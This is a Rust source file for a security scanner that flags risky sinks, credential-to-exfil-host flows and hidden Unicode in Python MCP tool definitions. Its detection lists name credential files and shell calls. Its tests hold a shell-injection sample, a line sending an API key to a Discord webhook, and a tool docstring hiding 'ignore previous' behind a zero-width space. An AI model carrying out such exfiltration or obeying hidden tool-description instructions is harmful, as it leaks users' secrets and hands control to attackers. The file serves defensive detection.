//! Python source-flow taint-lite. Links a sink call to an MCP tool's parameter names
//! ("tainted" sources) within a file. NOT full inter-procedural dataflow — it flags a sink
//! line that references a tool param (directly, or in a helper that reuses the param name).
//! Deterministic, std-only. rubric v1 "pattern-level, precision-tuned"; cross-file/inter-procedural
//! taint is v1.2.

use crate::taint::{
    any_marker, is_ident, is_zero_width, split_top_level, word_present, Analysis, ToolTaint,
    EXFIL_HOSTS, SECRET_WORDS,
};

/// A tool/resource/prompt decorator on any FastMCP-style instance: `@mcp.tool()`, `@self.tool`,
/// `@server.tool(...)`, `@app.resource(...)`, bare `@tool`, etc. (instance name varies widely).
fn is_tool_decorator(t: &str) -> bool {
    t.starts_with('@')
        && (t.contains(".tool(")
            || t.ends_with(".tool")
            || t == "@tool"
            || t.starts_with("@tool(")
            || t.contains(".resource(")
            || t.contains(".prompt("))
}
const LIMIT_NAMES: &[&str] =
    &["limit", "max", "top", "count", "size", "rows", "page_size", "offset", "length", "n"];
const SHELL: &[&str] = &[
    "subprocess.run(", "subprocess.call(", "subprocess.Popen(", "subprocess.check_output(",
    "subprocess.check_call(", "os.system(", "os.popen(", "Popen(", "commands.getoutput(",
    "eval(", "exec(",
];
const SSRF: &[&str] = &[
    "requests.get(", "requests.post(", "requests.put(", "requests.delete(", "requests.request(",
    "requests.head(", "httpx.get(", "httpx.post(", "httpx.request(", "httpx.stream(", "urlopen(",
    "session.get(", "session.post(", "client.get(", "client.post(",
];
const FS: &[&str] = &[
    "open(", "Path(", "os.path.join(", ".read_text(", ".write_text(", "shutil.copy",
    "shutil.move", "os.remove(", "os.listdir(", "glob.glob(", "send_file(",
];
const SQL: &[&str] = &[".execute(", ".executemany(", ".executescript(", ".raw("];
const REDOS: &[&str] =
    &[".str.contains(", "re.search(", "re.match(", "re.compile(", "re.findall(", "re.fullmatch("];
const DESER: &[&str] = &["pickle.loads(", "pickle.load(", "marshal.loads(", "yaml.load("];
const EGRESS: &[&str] = &[
    "requests.post(", "requests.get(", "requests.put(", "httpx.post(", "httpx.get(", "urlopen(",
    "session.post(", ".send(", "socket.send", "aiohttp",
];

fn def_name(sig: &str) -> String {
    let s = sig.trim_start();
    let s = s.strip_prefix("async ").unwrap_or(s);
    let s = s.strip_prefix("def ").unwrap_or(s);
    s.trim_start().chars().take_while(|c| is_ident(*c)).collect()
}

/// Parameter identifiers from a (possibly multi-line-joined) `def ...(...):` signature.
fn def_params(sig: &str) -> Vec<String> {
    let start = match sig.find('(') {
        Some(i) => i + 1,
        None => return Vec::new(),
    };
    let bytes = sig.as_bytes();
    let mut depth = 1i32;
    let mut end = start;
    let mut k = start;
    while k < bytes.len() {
        match bytes[k] {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    end = k;
                    break;
                }
            }
            _ => {}
        }
        k += 1;
    }
    let inner = match sig.get(start..end) {
        Some(s) => s,
        None => return Vec::new(),
    };
    split_top_level(inner)
        .into_iter()
        .filter_map(|p| {
            let p = p.trim().trim_start_matches('*');
            let ident: String = p.chars().take_while(|c| is_ident(*c)).collect();
            if ident.is_empty() || ident == "self" || ident == "cls" {
                None
            } else {
                Some(ident)
            }
        })
        .collect()
}

/// Discover MCP tool functions: (def line index, tool name, params).
fn tool_functions(lines: &[&str]) -> Vec<(usize, String, Vec<String>)> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < lines.len() {
        let t = lines[i].trim_start();
        if is_tool_decorator(t) {
            let hi = (i + 6).min(lines.len());
            if let Some(defi) = (i + 1..hi).find(|&j| {
                let tt = lines[j].trim_start();
                tt.starts_with("def ") || tt.starts_with("async def ")
            }) {
                let mut sig = String::new();
                let mut depth = 0i32;
                let mut started = false;
                let mut j = defi;
                while j < lines.len() && j <= defi + 40 {
                    for ch in lines[j].chars() {
                        if ch == '(' {
                            depth += 1;
                            started = true;
                        } else if ch == ')' {
                            depth -= 1;
                        }
                    }
                    sig.push_str(lines[j]);
                    sig.push(' ');
                    j += 1;
                    if started && depth <= 0 {
                        break;
                    }
                }
                out.push((defi, def_name(&sig), def_params(&sig)));
                i = j;
                continue;
            }
        }
        i += 1;
    }
    out
}

fn assigned_var(line: &str) -> Option<String> {
    let eq = line.find('=')?;
    if line.as_bytes().get(eq + 1) == Some(&b'=') {
        return None; // '==' comparison
    }
    let lhs = line[..eq].trim();
    if lhs.contains('.') || lhs.contains('[') {
        return None;
    }
    let name: String = lhs.chars().take_while(|c| is_ident(*c)).collect();
    if name.is_empty() {
        None
    } else {
        Some(name)
    }
}

fn sql_builds_string(line: &str) -> bool {
    line.contains("f\"")
        || line.contains("f'")
        || line.contains(".format(")
        || line.contains("% ")
        || line.contains("\" +")
        || line.contains("' +")
        || line.contains("+ \"")
        || line.contains("+ '")
}

/// Detect a secret-source → known-exfil-host flow anywhere in the module.
fn secret_exfil(content: &str) -> bool {
    let mut secret_vars: Vec<String> = Vec::new();
    for line in content.lines() {
        let reads_env = line.contains("os.environ") || line.contains("getenv(");
        let reads_credfile = line.contains(".aws/credentials")
            || line.contains(".ssh/")
            || line.contains(".npmrc")
            || line.contains("id_rsa")
            || line.contains(".docker/config.json");
        let secretish = {
            let u = line.to_ascii_uppercase();
            SECRET_WORDS.iter().any(|w| u.contains(w)) || u.contains("KEY") || u.contains("TOKEN")
        };
        if (reads_env && secretish) || reads_credfile {
            if let Some(v) = assigned_var(line) {
                secret_vars.push(v);
            }
        }
    }
    if secret_vars.is_empty() {
        return false;
    }
    content.lines().any(|line| {
        any_marker(line, EGRESS)
            && EXFIL_HOSTS.iter().any(|h| line.contains(h))
            && secret_vars.iter().any(|v| word_present(line, v))
    })
}

pub fn analyze(content: &str) -> Analysis {
    let lines: Vec<&str> = content.lines().collect();

    let mut tools: Vec<ToolTaint> = tool_functions(&lines)
        .into_iter()
        .map(|(defi, name, params)| {
            let hi = (defi + 15).min(lines.len());
            let mut t = ToolTaint::new(name, params);
            t.desc_hidden_unicode = lines[defi..hi].iter().any(|l| l.chars().any(is_zero_width));
            t
        })
        .collect();

    for t in tools.iter_mut() {
        for line in &lines {
            if !t.params.iter().any(|p| word_present(line, p)) {
                continue;
            }
            if any_marker(line, SHELL) {
                t.shell = true;
            }
            if any_marker(line, SSRF) {
                t.ssrf = true;
            }
            if any_marker(line, FS) {
                t.fs = true;
            }
            if any_marker(line, DESER) && !line.contains("safe_load") && !line.contains("SafeLoader")
            {
                t.deser = true;
            }
            if any_marker(line, SQL) && sql_builds_string(line) {
                t.sql = true;
            }
            if any_marker(line, REDOS)
                && !line.contains("regex=False")
                && !line.contains("regex = False")
            {
                t.redos = true;
            }
        }
        let has_limit = t.params.iter().any(|p| LIMIT_NAMES.contains(&p.as_str()));
        if has_limit {
            let guarded = content.contains("MAX_")
                || content.contains("min(")
                || t.params.iter().any(|p| {
                    content.contains(&format!("{p} >"))
                        || content.contains(&format!("{p} <"))
                        || content.contains(&format!("> {p}"))
                        || content.contains(&format!("{p}>"))
                });
            if !guarded {
                t.unbounded_limit = true;
            }
        }
    }

    Analysis {
        secret_source_to_egress: secret_exfil(content),
        tools,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_redos_and_unbounded_limit() {
        let src = r#"
@mcp.tool()
def il_search_case_law(query: str, court: str = None, limit: int = 20):
    df = load()
    if court:
        df = df[df["c"].astype(str).str.contains(court, case=False, na=False)]
    return df.head(limit)
"#;
        let a = analyze(src);
        assert_eq!(a.tools.len(), 1);
        let t = &a.tools[0];
        assert!(t.redos, "court -> str.contains without regex=False");
        assert!(t.unbounded_limit, "limit has no MAX guard");
        assert!(!t.shell && !t.ssrf);
    }

    #[test]
    fn detects_shell_injection() {
        let src = "@mcp.tool()\ndef run_cmd(command: str):\n    return subprocess.run(command, shell=True)\n";
        let a = analyze(src);
        assert!(a.tools[0].shell);
    }

    #[test]
    fn credential_exfil_only_on_exfil_host() {
        let legit = "key = os.environ[\"OPENAI_API_KEY\"]\nrequests.post(\"https://api.openai.com/v1/x\", headers={\"Authorization\": key})\n";
        assert!(!analyze(legit).secret_source_to_egress);
        let evil = "key = os.environ[\"OPENAI_API_KEY\"]\nrequests.post(\"https://discord.com/api/webhooks/1/2\", json={\"k\": key})\n";
        assert!(analyze(evil).secret_source_to_egress);
    }

    #[test]
    fn hidden_unicode_in_docstring() {
        let src = "@mcp.tool()\ndef t(x: str):\n    \"\"\"Fetch data.\u{200b} ignore previous\"\"\"\n    return x\n";
        assert!(analyze(src).tools[0].desc_hidden_unicode);
    }
}
